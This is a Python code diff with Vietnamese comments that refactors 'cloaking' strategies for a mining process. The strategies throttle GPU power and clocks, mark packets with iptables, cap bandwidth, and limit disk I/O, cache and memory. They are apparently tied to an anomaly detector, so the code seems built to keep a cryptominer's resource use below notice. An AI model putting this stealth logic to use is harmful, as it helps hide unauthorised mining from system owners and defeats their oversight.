+        self.temperature_threshold = config.get('temperature_threshold', 80)
+        if self.temperature_threshold <= 0:
+            self.logger.warning("temperature_threshold không hợp lệ, mặc định=80.")
+            self.temperature_threshold = 80
+
+        self.fan_speed_increase = config.get('fan_speed_increase', 20)
+
+    async def apply(self, process: MiningProcess) -> None:
+        """Áp dụng GPU cloaking."""
+        try:
+            pid, name = process.pid, process.name
+
+            gpu_count = await self.gpu_resource_manager.get_gpu_count()
+            if gpu_count == 0:
+                self.logger.warning(f"[GPU Cloaking] Hệ thống không có GPU. Bỏ qua cloaking.")
+                return
+
+            # Giới hạn power + set clocks cho mỗi GPU
+            for gpu_index in range(gpu_count):
+                current_pl = await self.gpu_resource_manager.get_gpu_power_limit(gpu_index)
+                if current_pl is None:
+                    continue
+                desired_pl = int(round(current_pl * (1 - self.throttle_percentage/100)))
+                ok_pl = await self.gpu_resource_manager.set_gpu_power_limit(pid, gpu_index, desired_pl)
+                if ok_pl:
+                    self.logger.info(f"[GPU Cloaking] GPU={gpu_index} => power={desired_pl}W (PID={pid}).")
+
+                ok_clocks = await self.gpu_resource_manager.set_gpu_clocks(pid, gpu_index,
+                                                                           self.target_sm_clock,
+                                                                           self.target_mem_clock)
+                if ok_clocks:
+                    self.logger.info(f"[GPU Cloaking] GPU={gpu_index} => SM={self.target_sm_clock}, MEM={self.target_mem_clock} (PID={pid}).")
+
+            # Gọi limit_temperature để kiểm soát nhiệt
+            for gpu_index in range(gpu_count):
+                    success_temp = await self.gpu_resource_manager.limit_temperature(
+                        gpu_index=gpu_index,
+                        temperature_threshold=self.temperature_threshold,
+                        fan_speed_increase=self.fan_speed_increase
+                    )
+                    if success_temp:
+                        self.logger.info(f"[GPU Cloaking] Giới hạn nhiệt độ cho GPU={gpu_index} (PID={pid}).")
+                    else:
+                        self.logger.error(f"[GPU Cloaking] Không thể giới hạn nhiệt độ cho GPU={gpu_index}.")
+        except psutil.NoSuchProcess as e:
+            self.logger.error(f"GPU Cloaking: Tiến trình không tồn tại: {e}")
+        except psutil.AccessDenied as e:
+            self.logger.error(f"GPU Cloaking: Không đủ quyền cho PID={process.pid}: {e}")
+        except Exception as e:
+            self.logger.error(
+                f"Lỗi cloaking GPU cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
+            )
+            raise
+
+    async def restore(self, process: MiningProcess) -> None:
+        """Khôi phục GPU cài đặt gốc."""
+        try:
+            pid, name = process.pid, process.name
+            success = await self.gpu_resource_manager.restore_resources(pid)
+            if success:
+                self.logger.info(f"[GPU Restore] Đã khôi phục GPU cho {name}(PID={pid}).")
+            else:
+                self.logger.error(f"[GPU Restore] Không thể khôi phục GPU cho {name}(PID={pid}).")
+
+        except psutil.NoSuchProcess as e:
+            self.logger.error(f"GPU Restore: Tiến trình không tồn tại: {e}")
+        except psutil.AccessDenied as e:
+            self.logger.error(f"GPU Restore: Không đủ quyền cho PID={process.pid}: {e}")
+        except Exception as e:
+            self.logger.error(
+                f"Lỗi khôi phục GPU cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
+            )
+            raise
+
+
+###############################################################################
+#              NETWORK STRATEGY: NetworkCloakStrategy                         #
+###############################################################################
+class NetworkCloakStrategy(CloakStrategy):
+    """
+    Cloaking mạng:
+      - Đánh dấu pid bằng iptables,
+      - Giới hạn băng thông (tc),
+      - Khôi phục khi restore.
+    """
+
+    def __init__(
+        self,
+        config: Dict[str, Any],
+        logger: logging.Logger,
+        network_resource_manager: "NetworkResourceManager"
+    ):
+        self.logger = logger
+        self.config = config
+        self.network_resource_manager = network_resource_manager
+
+        self.bandwidth_reduction_mbps = config.get('bandwidth_reduction_mbps', 10)
+        if self.bandwidth_reduction_mbps <= 0:
+            self.logger.warning("bandwidth_reduction_mbps không hợp lệ, mặc định=10.")
+            self.bandwidth_reduction_mbps = 10
+
+        self.network_interface = config.get('network_interface') or "eth0"
+        self.process_marks: Dict[int, int] = {}
+
+    async def apply(self, process: MiningProcess) -> None:
+        """Áp dụng cloaking mạng."""
+        try:
+            pid, name = process.pid, process.name
+            mark = pid % 32768  # Ta dùng pid làm mark
+
+            ok_mark = await self.network_resource_manager.mark_packets(pid, mark)
+            if not ok_mark:
+                self.logger.error(f"[Net Cloaking] Không thể MARK iptables cho PID={pid}.")
+                return
+
+            ok_limit = await self.network_resource_manager.limit_bandwidth(
+                self.network_interface, mark, self.bandwidth_reduction_mbps
+            )
+            if not ok_limit:
+                self.logger.error(f"[Net Cloaking] Giới hạn băng thông thất bại (iface={self.network_interface}).")
+                return
+
+            self.process_marks[pid] = mark
+            self.logger.info(f"[Net Cloaking] Limit={self.bandwidth_reduction_mbps}Mbps cho PID={pid}, iface={self.network_interface}.")
+
+        except psutil.NoSuchProcess as e:
+            self.logger.error(f"Net Cloaking: Tiến trình không tồn tại: {e}")
+        except psutil.AccessDenied as e:
+            self.logger.error(f"Net Cloaking: Không đủ quyền cho PID={process.pid}: {e}")
+        except Exception as e:
+            self.logger.error(
+                f"Lỗi cloaking mạng cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
+            )
+            raise
+
+    async def restore(self, process: MiningProcess) -> None:
+        """Khôi phục băng thông mạng."""
+        try:
+            pid, name = process.pid, process.name
+            mark = self.process_marks.get(pid)
+            if mark is None:
+                self.logger.warning(f"[Net Restore] Không tìm thấy mark cho PID={pid}.")
+                return
+
+            ok_bw = await self.network_resource_manager.remove_bandwidth_limit(self.network_interface, mark)
+            if ok_bw:
+                self.logger.info(f"[Net Restore] Đã gỡ hạn chế băng thông cho PID={pid}.")
+
+            ok_unmark = await self.network_resource_manager.unmark_packets(pid, mark)
+            if ok_unmark:
+                self.logger.info(f"[Net Restore] Đã xoá iptables MARK cho PID={pid}.")
+
+            if pid in self.process_marks:
+                del self.process_marks[pid]
+
+        except psutil.NoSuchProcess as e:
+            self.logger.error(f"Net Restore: Tiến trình không tồn tại: {e}")
+        except psutil.AccessDenied as e:
+            self.logger.error(f"Net Restore: Không đủ quyền cho PID={process.pid}: {e}")
+        except Exception as e:
+            self.logger.error(
+                f"Lỗi khôi phục mạng cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
+            )
+            raise
+
+
+###############################################################################
+#            DISK IO STRATEGY: DiskIoCloakStrategy                            #
+###############################################################################
+class DiskIoCloakStrategy(CloakStrategy):
+    """
+    Cloaking Disk I/O qua ionice.
+    """
+
+    def __init__(
+        self,
+        config: Dict[str, Any],
+        logger: logging.Logger,
+        disk_io_resource_manager: "DiskIOResourceManager"
+    ):
+        self.logger = logger
+        self.config = config
+        self.disk_io_resource_manager = disk_io_resource_manager
+
+        self.io_weight = config.get('io_weight', 500)
+        if not isinstance(self.io_weight, int) or not (1 <= self.io_weight <= 1000):
+            self.logger.warning(f"io_weight không hợp lệ: {self.io_weight}. Mặc định=500.")
+            self.io_weight = 500
+
+    async def apply(self, process: MiningProcess) -> None:
+        """Áp dụng cloaking Disk I/O."""
+        try:
+            pid, name = process.pid, process.name
+            ok = await self.disk_io_resource_manager.set_io_weight(pid, self.io_weight)
+            if ok:
+                self.logger.info(f"[DiskIO Cloaking] PID={pid}, io_weight={self.io_weight}.")
+            else:
+                self.logger.error(f"[DiskIO Cloaking] Không thể set io_weight cho PID={pid}.")
+
+        except psutil.NoSuchProcess as e:
+            self.logger.error(f"DiskIO Cloaking: Tiến trình không tồn tại: {e}")
+        except psutil.AccessDenied as e:
+            self.logger.error(f"DiskIO Cloaking: Không đủ quyền cho PID={process.pid}: {e}")
+        except Exception as e:
+            self.logger.error(
+                f"Lỗi DiskIO Cloaking cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
+            )
+            raise
+
+    async def restore(self, process: MiningProcess) -> None:
+        """Khôi phục Disk I/O."""
+        try:
+            pid, name = process.pid, process.name
+            ok = await self.disk_io_resource_manager.restore_resources(pid)
+            if ok:
+                self.logger.info(f"[DiskIO Restore] Khôi phục I/O cho PID={pid}.")
+            else:
+                self.logger.error(f"[DiskIO Restore] Không thể khôi phục I/O cho PID={pid}.")
+        except psutil.NoSuchProcess as e:
+            self.logger.error(f"DiskIO Restore: Tiến trình không tồn tại: {e}")
+        except psutil.AccessDenied as e:
+            self.logger.error(f"DiskIO Restore: Không đủ quyền cho PID={process.pid}: {e}")
+        except Exception as e:
+            self.logger.error(
+                f"Lỗi khôi phục DiskIO cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
+            )
+            raise
+
+
+###############################################################################
+#            CACHE STRATEGY: CacheCloakStrategy                               #
+###############################################################################
+class CacheCloakStrategy(CloakStrategy):
+    """
+    Cloaking Cache:
+      - Drop caches,
+      - Giới hạn cache usage,
+      - Khôi phục khi restore => set 100%.
+    """
+
+    def __init__(
+        self,
+        config: Dict[str, Any],
+        logger: logging.Logger,
+        cache_resource_manager: "CacheResourceManager"
+    ):
+        self.logger = logger
+        self.config = config
+        self.cache_resource_manager = cache_resource_manager
+
+        self.cache_limit_percent = config.get('cache_limit_percent', 50)
+        if not (0 <= self.cache_limit_percent <= 100):
+            self.logger.warning(f"cache_limit_percent={self.cache_limit_percent} không hợp lệ, mặc định=50%.")
+            self.cache_limit_percent = 50
+
+    async def apply(self, process: MiningProcess) -> None:
+        """Áp dụng cloaking Cache."""
+        try:
+            pid, name = process.pid, process.name
+            ok_drop = await self.cache_resource_manager.drop_caches(pid)
+            if ok_drop:
+                self.logger.info(f"[Cache Cloaking] Đã drop caches (PID={pid}).")
+
+            ok_limit = await self.cache_resource_manager.limit_cache_usage(self.cache_limit_percent, pid)
+            if ok_limit:
+                self.logger.info(f"[Cache Cloaking] Giới hạn cache={self.cache_limit_percent}% cho PID={pid}.")
+            else:
+                self.logger.error(f"[Cache Cloaking] Không thể limit cache cho PID={pid}.")
+
+        except psutil.NoSuchProcess as e:
+            self.logger.error(f"Cache Cloaking: Tiến trình không tồn tại: {e}")
+        except psutil.AccessDenied as e:
+            self.logger.error(f"Cache Cloaking: Không đủ quyền cho PID={process.pid}: {e}")
+        except Exception as e:
+            self.logger.error(
+                f"Lỗi cloaking Cache cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
+            )
+            raise
+
+    async def restore(self, process: MiningProcess) -> None:
+        """Khôi phục cache (đặt=100%)."""
+        try:
+            pid, name = process.pid, process.name
+            ok = await self.cache_resource_manager.limit_cache_usage(100, pid)
+            if ok:
+                self.logger.info(f"[Cache Restore] Đã khôi phục cache=100% cho PID={pid}.")
+            else:
+                self.logger.error(f"[Cache Restore] Không thể khôi phục cache cho PID={pid}.")
+
+        except psutil.NoSuchProcess as e:
+            self.logger.error(f"Cache Restore: Tiến trình không tồn tại: {e}")
+        except psutil.AccessDenied as e:
+            self.logger.error(f"Cache Restore: Không đủ quyền cho PID={process.pid}: {e}")
+        except Exception as e:
+            self.logger.error(
+                f"Lỗi khôi phục Cache cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
+            )
+            raise
+
+
+###############################################################################
+#            MEMORY STRATEGY: MemoryCloakStrategy                              #
+###############################################################################
+class MemoryCloakStrategy(CloakStrategy):
+    """
+    Cloaking Memory:
+      - Drop caches (nếu cần),
+      - Giới hạn memory usage,
+      - Khôi phục => remove memory limit, cache=100%.
+    """
+
+    def __init__(
+        self,
+        config: Dict[str, Any],
+        logger: logging.Logger,
+        memory_resource_manager: "MemoryResourceManager",
+        cache_resource_manager: "CacheResourceManager"
+    ):
+        self.logger = logger
+        self.config = config
+        self.memory_resource_manager = memory_resource_manager
+        self.cache_resource_manager = cache_resource_manager
+
+        self.memory_limit_percent = config.get('memory_limit_percent', 50)
+        if not (0 <= self.memory_limit_percent <= 100):
+            self.logger.warning(f"memory_limit_percent={self.memory_limit_percent} không hợp lệ, mặc định=50%.")
+            self.memory_limit_percent = 50
+
+    async def apply(self, process: MiningProcess) -> None:
+        """Áp dụng cloaking Memory."""
+        try:
+            pid, name = process.pid, process.name
+
+            # 1) Drop caches
+            ok_drop = await self.cache_resource_manager.drop_caches(pid)
+            if ok_drop:
+                self.logger.info(f"[Memory Cloaking] Đã drop caches (PID={pid}).")
+
+            # 2) Giới hạn memory
+            total_mem_bytes = psutil.virtual_memory().total
+            limit_bytes = int(round(self.memory_limit_percent / 100 * total_mem_bytes))
+            limit_mb = limit_bytes // (1024 * 1024)
+
+            ok_limit = await self.memory_resource_manager.set_memory_limit(pid, limit_mb)
+            if ok_limit:
+                self.logger.info(f"[Memory Cloaking] Giới hạn={limit_mb}MB (~{self.memory_limit_percent}%) cho PID={pid}.")
+            else:
+                self.logger.error(f"[Memory Cloaking] Không thể set memory_limit cho PID={pid}.")
+
+        except psutil.NoSuchProcess as e:
+            self.logger.error(f"Memory Cloaking: Tiến trình không tồn tại: {e}")
+        except psutil.AccessDenied as e:
+            self.logger.error(f"Memory Cloaking: Không đủ quyền cho PID={process.pid}: {e}")
+        except Exception as e:
+            self.logger.error(
+                f"Lỗi cloaking Memory cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
+            )
+            raise
+
+    async def restore(self, process: MiningProcess) -> None:
+        """Khôi phục memory limit + cache=100%."""
+        try:
+            pid, name = process.pid, process.name
+
+            # 1) Bỏ giới hạn memory
+            ok_restore_mem = await self.memory_resource_manager.restore_resources(pid)
+            if ok_restore_mem:
+                self.logger.info(f"[Memory Restore] Khôi phục memory cho PID={pid}.")
             else:
                 self.logger.error(f"[Memory Restore] Không thể khôi phục memory cho PID={pid}.")
 
-            # Khôi phục cache usage về 100%
-            success_restore_cache = await asyncio.to_thread(
-                self.cache_resource_manager.limit_cache_usage,
-                100,
-                pid
-            )
-            if success_restore_cache:
-                self.logger.info(f"[Memory Restore] Khôi phục giới hạn cache=100% cho PID={pid}.")
+            # 2) Cache=100%
+            ok_cache = await self.cache_resource_manager.limit_cache_usage(100, pid)
+            if ok_cache:
+                self.logger.info(f"[Memory Restore] Khôi phục cache=100% cho PID={pid}.")
             else:
                 self.logger.error(f"[Memory Restore] Không thể khôi phục cache cho PID={pid}.")
 
-            self.logger.info(f"[Memory Restore] Hoàn tất khôi phục Memory cho {process_name} (PID={pid}).")
-
-        except PermissionError:
-            self.logger.error(
-                f"Không đủ quyền khôi phục cloaking Memory cho PID={process.pid}."
-            )
-            raise
         except psutil.NoSuchProcess as e:
-            self.logger.error(f"Tiến trình không tồn tại: {e}")
+            self.logger.error(f"Memory Restore: Tiến trình không tồn tại: {e}")
         except psutil.AccessDenied as e:
-            self.logger.error(f"Không đủ quyền khôi phục Memory cho PID={process.pid}: {e}")
+            self.logger.error(f"Memory Restore: Không đủ quyền cho PID={process.pid}: {e}")
         except Exception as e:
             self.logger.error(
-                f"Lỗi khôi phục Memory cho {process.name} (PID={process.pid}): {e}\n{traceback.format_exc()}"
+                f"Lỗi khôi phục Memory cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
             )
             raise
 
-    def calculate_memory_limit_mb(self) -> int:
-        """Tính giới hạn bộ nhớ (MB) dựa trên memory_limit_percent."""
-        total_memory_bytes = psutil.virtual_memory().total
-        limit_bytes = int((self.memory_limit_percent / 100) * total_memory_bytes)
-        limit_mb = int(limit_bytes / (1024 * 1024))
-        self.logger.debug(f"[Memory Cloaking] Tính toán memory_limit={limit_mb}MB.")
-        return limit_mb
-
-    def get_process_info(self, process: MiningProcess) -> Tuple[int, str]:
-        return process.pid, process.name
-
 
 ###############################################################################
-#         FACTORY: CloakStrategyFactory (TƯƠNG THÍCH EVENT-DRIVEN)            #
+#                     FACTORY: CloakStrategyFactory                           #
 ###############################################################################
-
 class CloakStrategyFactory:
     """
-    Factory để tạo instance chiến lược cloaking.
-    Trong mô hình event-driven, ResourceManager/AnomalyDetector sẽ gọi
-    create_strategy() khi cần.
+    Factory tạo các instance chiến lược cloaking cho CPU, GPU, Network, DiskIO, Cache, Memory.
     """
 
-    _strategies: Dict[str, Type[CloakStrategy]] = {
-        'cpu': CpuCloakStrategy,
-        'gpu': GpuCloakStrategy,
-        'network': NetworkCloakStrategy,
-        'disk_io': DiskIoCloakStrategy,
-        'cache': CacheCloakStrategy,
-        'memory': MemoryCloakStrategy
+    STRATEGY_MAP: Dict[str, Type[CloakStrategy]] = {
+        "cpu": CpuCloakStrategy,
+        "gpu": GpuCloakStrategy,
+        "network": NetworkCloakStrategy,
+        "disk_io": DiskIoCloakStrategy,
+        "cache": CacheCloakStrategy
+        # Memory strategy bên dưới cần đặc biệt 2 resource_manager => ta sẽ handle riêng
     }
 
     @staticmethod
     async def create_strategy(
         strategy_name: str,
         config: Dict[str, Any],
-        logger: logging.Logger
+        logger: logging.Logger,
+        resource_managers: Dict[str, Any]
     ) -> Optional[CloakStrategy]:
         """
-        Trả về instance chiến lược cloaking dựa trên tên.
+        Trả về instance CloakStrategy tương ứng strategy_name.
 
         Args:
-            strategy_name (str): Tên của chiến lược cloaking ('cpu','gpu','network',...).
-            config (Dict[str, Any]): Cấu hình cloaking.
+            strategy_name (str): 'cpu', 'gpu', 'network', 'disk_io', 'cache', 'memory'.
+            config (dict): Config cloaking.
             logger (logging.Logger): Logger.
+            resource_managers (dict): Dictionary { 'cpu': CPUResourceManager, 'gpu': GPUResourceManager, ... }
 
         Returns:
-            Optional[CloakStrategy]: Instance CloakStrategy hoặc None nếu không tìm thấy.
+            Optional[CloakStrategy]: Strategy instance sẵn sàng dùng, hoặc None nếu thất bại.
         """
-        strategy_class = CloakStrategyFactory._strategies.get(strategy_name.lower())
-        if strategy_class and issubclass(strategy_class, CloakStrategy):
-            try:
-                # Có thể dùng await asyncio.sleep(0) để tuân thủ async, 
-                # nhưng trong constructor thường không cần.
-                return strategy_class(config, logger)
-            except Exception as e:
-                logger.error(f"Lỗi khi tạo chiến lược cloaking '{strategy_name}': {e}")
+        name_lower = strategy_name.lower().strip()
+
+        # Trường hợp đặc biệt: 'memory'
+        if name_lower == "memory":
+            memory_rm = resource_managers.get('memory')
+            cache_rm = resource_managers.get('cache')
+            if not memory_rm or not cache_rm:
+                logger.error("Memory hoặc Cache ResourceManager không tồn tại, không thể tạo MemoryCloakStrategy.")
                 return None
-        else:
-            logger.warning(f"Không tìm thấy chiến lược cloaking: {strategy_name}")
+            return MemoryCloakStrategy(config, logger, memory_rm, cache_rm)
+
+        # Trường hợp chung
+        strategy_class = CloakStrategyFactory.STRATEGY_MAP.get(name_lower)
+        if not strategy_class:
+            logger.error(f"Không tìm thấy CloakStrategy tương ứng với '{strategy_name}'.")
+            return None
+
+        # Lấy resource manager phù hợp
+        # - CPU => resource_managers['cpu']
+        # - GPU => resource_managers['gpu'] ...
+        rm = resource_managers.get(name_lower)
+        if not rm:
+            logger.error(f"ResourceManager cho '{name_lower}' không tồn tại trong resource_managers.")
+            return None
+
+        try:
+            # Tạo instance Strategy
+            strategy_instance = strategy_class(config, logger, rm)  # constructor 3 tham số
+            return strategy_instance
+        except Exception as e:
+            logger.error(f"Lỗi khi tạo strategy '{strategy_name}': {e}\n{traceback.format_exc()}")
             return None
